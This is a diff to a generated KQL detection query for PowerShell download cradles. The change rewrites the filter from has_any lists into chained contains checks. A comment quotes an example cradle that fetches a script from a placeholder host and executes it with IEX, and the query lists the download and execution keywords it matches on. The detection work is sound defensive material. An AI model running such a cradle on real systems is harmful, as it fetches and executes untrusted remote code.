@@ -5,4 +5,4 @@
 //   powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://<host>/a.ps1')"
 // source: rules/execution/powershell-download-cradle.yml  (GENERATED, do not edit by hand)
 Event
-| where ((((NewProcessName endswith "\\powershell.exe" or NewProcessName endswith "\\pwsh.exe")) and ((CommandLine has_any (dynamic(["DownloadString", "DownloadFile", "Invoke-WebRequest", "Net.WebClient", "iwr ", "curl "]))))) and ((CommandLine has_any (dynamic(["IEX", "Invoke-Expression", "iex(", "| iex"])))))
+| where ((((NewProcessName endswith @"\powershell.exe" or NewProcessName endswith @"\pwsh.exe")) and ((CommandLine contains @"DownloadString" or CommandLine contains @"DownloadFile" or CommandLine contains @"Invoke-WebRequest" or CommandLine contains @"Net.WebClient" or CommandLine contains @"iwr " or CommandLine contains @"curl "))) and ((CommandLine contains @"IEX" or CommandLine contains @"Invoke-Expression" or CommandLine contains @"iex(" or CommandLine contains @"| iex")))
